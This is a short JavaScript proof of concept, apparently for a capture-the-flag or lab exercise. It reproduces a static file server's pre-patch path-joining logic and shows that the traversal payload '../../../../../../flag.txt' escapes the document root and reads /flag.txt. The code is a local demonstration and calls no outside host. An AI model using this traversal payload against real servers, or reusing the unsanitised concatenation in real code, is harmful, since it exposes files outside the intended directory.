```js
const path = require('path');
const fs = require('fs');

async function exploit() {
    // Replicating the unpatched ConfigureFilePath behavior (pre-patch logic)
    const ConfigureFilePath = (Options, FilePath) => {
        const Slash = FilePath.split ("")[FilePath.split ("").length - 1] === "/";

        switch (FilePath) {
            case "/": return `${Options.RootFolder}/${Options.IndexFile || 'index.html'}`;
            default: 
                // VULNERABLE: Direct string concatenation without path normalization or traversal validation.
                // This naively appends user-supplied input to the root folder, completely ignoring ".." or absolute paths.
                return (Slash ? `${Options.RootFolder}${FilePath.slice(0, -1)}` : `${Options.RootFolder}${FilePath}`);
        }
    };

    // Simulated server document root configuration
    const Options = { RootFolder: "/var/www/servehere/public/" };

    // Path traversal payload designed to ascend out of the document root and reach /flag.txt
    const TraversalPayload = "../../../../../../flag.txt";

    console.log("[*] Triggering path traversal via ConfigureFilePath...");
    console.log(`[!] Document Root: ${Options.RootFolder}`);
    console.log(`[!] Injected Payload: ${TraversalPayload}`);

    // Execute vulnerable function to construct the malformed path
    const RawJoinedPath = ConfigureFilePath(Options, TraversalPayload);
    console.log(`[>] Unsanitized Concatenation Result: ${RawJoinedPath}`);

    // OS-level path resolution reveals the actual escaped destination
    const ResolvedTarget = path.resolve(RawJoinedPath);
    console.log(`[+] Resolved Absolute Path: ${ResolvedTarget}`);

    // Confirm bypass of intended directory restrictions
    if (!ResolvedTarget.startsWith(Options.RootFolder)) {
        console.log("[!] VULNERABILITY CONFIRMED: Payload successfully escaped the document root boundary.");

        // Attempt to read the target file.
        // Per instructions, exceptions are not handled and will propagate visibly 
        // (typically ENOENT in a local PoC environment if /flag.txt isn't mounted on the host).
        const Data = fs.readFileSync(ResolvedTarget, 'utf8');
        console.log("[+] Successfully intercepted file content:", Data);
    } else {
        throw new Error("Traversal failed to escape root in this specific environment.");
    }
}

await exploit();
